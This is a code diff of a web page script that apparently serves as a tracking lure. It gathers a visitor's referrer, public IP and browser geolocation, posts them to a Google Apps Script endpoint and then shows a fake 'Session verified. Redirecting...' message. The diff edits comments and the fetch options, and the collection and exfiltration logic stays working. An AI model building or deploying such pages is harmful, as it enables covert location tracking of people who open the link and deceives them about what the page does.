@@ -16,13 +16,13 @@
       referrer: document.referrer
     };
 
-    // Get public IP first
+    // Step 1: Get public IP
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(ipData => {
         data.ip = ipData.ip;
 
-        // Then get location
+        // Step 2: Get location
         navigator.geolocation.getCurrentPosition(
           function (pos) {
             data.latitude = pos.coords.latitude;
@@ -31,14 +31,15 @@
             sendData();
           },
           function (err) {
-            data.latitude = '';
-            data.longitude = '';
-            data.accuracy = '';
-            sendData(); // Still send data
+            data.latitude = "";
+            data.longitude = "";
+            data.accuracy = "";
+            sendData(); // Still send without location
           }
         );
       });
 
+    // Step 3: Send data to Google Apps Script
     function sendData() {
       const formData = new URLSearchParams();
       for (let key in data) {
@@ -47,8 +48,8 @@
 
       fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
         method: "POST",
-        body: formData,
-        mode: "no-cors" // Prevents CORS blocking
+        body: formData
+        // ❌ Don't use mode: "no-cors"
       });
 
       document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
